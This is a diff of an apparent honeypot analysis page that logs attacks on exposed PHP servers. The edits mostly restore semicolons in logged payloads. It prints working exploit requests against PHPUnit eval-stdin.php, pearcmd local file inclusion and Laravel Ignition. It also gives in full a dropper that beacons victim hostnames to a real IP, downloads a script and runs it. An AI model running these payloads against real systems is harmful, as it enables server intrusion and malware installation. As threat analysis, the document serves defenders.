@@ -183,13 +183,13 @@ td code{overflow-wrap:anywhere}
 <p>The list is a map of where frameworks and CMSs keep their <code>vendor</code> directory: Laravel, Yii, Zend, Drupal, WordPress plugins, and common sub-directory names.</p>
 <p>The bodies sent to those paths:</p>
 <table><thead><tr><th>Requests</th><th>IPs</th><th>Method</th><th>Body</th><th>Purpose</th></tr></thead><tbody>
-<tr><td>407</td><td>11</td><td>GET</td><td><code>&lt;?php echo(md5("Hello PHPUnit"))</code></td><td>RedTail bot check: prints a known MD5</td></tr>
+<tr><td>407</td><td>11</td><td>GET</td><td><code>&lt;?php echo(md5("Hello PHPUnit"));</code></td><td>RedTail bot check: prints a known MD5</td></tr>
 <tr><td>3</td><td>1</td><td>GET</td><td><code></code></td><td>No body: only tests whether the file exists</td></tr>
-<tr><td>2</td><td>1</td><td>POST</td><td><code>&lt;?php echo "SNIPPER_OK_" . php_uname("a")  ?&gt;</code></td><td>Check that also returns the kernel and hostname (php_uname)</td></tr>
-<tr><td>2</td><td>1</td><td>POST</td><td><code>&lt;?= system('echo $((63187*52324))') ?&gt;</code></td><td>Arithmetic check: a working shell prints 3306196588</td></tr>
+<tr><td>2</td><td>1</td><td>POST</td><td><code>&lt;?php echo "SNIPPER_OK_" . php_uname("a"); ?&gt;</code></td><td>Check that also returns the kernel and hostname (php_uname)</td></tr>
+<tr><td>2</td><td>1</td><td>POST</td><td><code>&lt;?= system('echo $((63187*52324))');?&gt;</code></td><td>Arithmetic check: a working shell prints 3306196588</td></tr>
 <tr><td>2</td><td>1</td><td>POST</td><td><code>&lt;?php system("(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124. [... 1406 bytes, in full below]</code></td><td>Full dropper, no check first (section 3)</td></tr>
-<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST220103  id')  ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
-<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST573132  id')  ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
+<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST220103; id'); ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
+<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST573132; id'); ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
 <tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('(wget -qO- hxxp://178.83.188.141:8880/t/ab34b0924da428774dc2316a||curl -s hxxp://178.83.188.141:8880/t/ab3 [... 236 bytes, in full below]</code></td><td>Callback only: fetches a URL with a per-target token and discards the output</td></tr>
 <tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('(wget -qO- hxxp://178.83.188.141:8880/t/980861d4beba13102cc58716||curl -s hxxp://178.83.188.141:8880/t/980 [... 236 bytes, in full below]</code></td><td>Callback only: fetches a URL with a per-target token and discards the output</td></tr>
 <tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('(wget -qO- hxxp://178.83.188.141:8880/t/16f91336ac44940df95c5fd2||curl -s hxxp://178.83.188.141:8880/t/16f [... 236 bytes, in full below]</code></td><td>Callback only: fetches a URL with a per-target token and discards the output</td></tr>
@@ -200,8 +200,8 @@ td code{overflow-wrap:anywhere}
 <tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('(wget -qO- hxxp://178.83.188.141:8880/t/0c46b11166b7d1cc647e7ee0||curl -s hxxp://178.83.188.141:8880/t/0c4 [... 236 bytes, in full below]</code></td><td>Callback only: fetches a URL with a per-target token and discards the output</td></tr>
 <tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('(wget -qO- hxxp://178.83.188.141:8880/t/c34d3e93902699356b6eb1d5||curl -s hxxp://178.83.188.141:8880/t/c34 [... 236 bytes, in full below]</code></td><td>Callback only: fetches a URL with a per-target token and discards the output</td></tr>
 <tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('(wget -qO- hxxp://178.83.188.141:8880/t/2a887dd26ad49a6a6cae397d||curl -s hxxp://178.83.188.141:8880/t/2a8 [... 236 bytes, in full below]</code></td><td>Callback only: fetches a URL with a per-target token and discards the output</td></tr>
-<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST790126  id')  ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
-<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST429990  id')  ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
+<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST790126; id'); ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
+<tr><td>1</td><td>1</td><td>POST</td><td><code>&lt;?php system('echo PAST429990; id'); ?&gt;</code></td><td>Marker plus id: confirms execution and shows the user</td></tr>
 </tbody></table>
 <p>Four styles of "did it work?" check are visible. An MD5 of a fixed string. A marker plus <code>php_uname</code>. A multiplication (<code>63187*52324</code>) whose answer, 3306196588, appears nowhere in the request, so a reflected body cannot cause a false positive. And <code>echo PAST&lt;number&gt;; id</code>, which also tells the attacker which user the web server runs as. Two actors skipped the check and sent the dropper straight away.</p>
 
@@ -210,17 +210,20 @@ td code{overflow-wrap:anywhere}
 <pre><code>2026-11-08 14:02:15 UTC  195.178.110.78 (Bulgaria)  status 404  request 1704 bytes  response 494 bytes
 
 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0  Win64  x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
 Content-Type: text/plain
 
-&lt;?php system("(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1) sleep 5 cd /tmp||cd /dev/shm export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH (/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s) test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s) test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1) /bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y (/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)")  ?&gt;</code></pre>
+&lt;?php system("(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);sleep 5;cd /tmp||cd /dev/shm;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH;(/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s);test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s);test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);/bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y;(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)"); ?&gt;</code></pre>
 <p>The shell command inside <code>system("…")</code>, one statement per line:</p>
-<pre><code>(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1)
-sleep 5 cd /tmp||cd /dev/shm export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH (/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s)
-test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s)
-test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1)
-/bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y (/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||
-(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)</code></pre>
+<pre><code>(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
+sleep 5;
+cd /tmp||cd /dev/shm;
+export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH;
+(/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s);
+test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s);
+test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
+/bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y;
+(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)</code></pre>
 <table>
 <tr><th>Step</th><th>What it does</th></tr>
 <tr><td><code>…:8099/b/e/$(uname -n)</code></td><td>Beacon "e" (executed). The victim's hostname is put in the URL path, so the operator's web log lists every host where the command ran, before anything is downloaded.</td></tr>
@@ -254,7 +257,7 @@ test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f
 <p>11 requests from 11 IPs, all RedTail. The pair:</p>
 <pre><code>2026-10-23 14:21:27 UTC  169.58.137.184 (France)  status 200  request 257 bytes  response 3689 bytes
 
-GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?echo(md5("hi")) ?&gt;+/tmp/index1.php HTTP/1.1
+GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?echo(md5("hi"));?&gt;+/tmp/index1.php HTTP/1.1
 User-Agent: libredtail-http
 
 GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1</code></pre>
@@ -275,7 +278,7 @@ GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1</code></pre>
 <pre><code>2026-10-25 16:11:33 UTC  31.76.118.108 (United States)  status 404  request 580 bytes  response 485 bytes
 
 POST /_ignition/execute-solution HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0  Win64  x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36
 Content-Type: application/json
 
 {"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"}}
@@ -284,7 +287,7 @@ Content-Type: application/json
 2026-10-28 15:21:42 UTC  181.215.186.252 (United Arab Emirates)  status 404  request 611 bytes  response 485 bytes
 
 GET /_ignition/health-check HTTP/1.1
-User-Agent: Mozilla/5.0 (compatible  ReconX-L2S/1.0)
+User-Agent: Mozilla/5.0 (compatible; ReconX-L2S/1.0)
 
 
 2026-11-05 23:31:45 UTC  92.118.39.92 (United States)  status 404  request 498 bytes  response 480 bytes
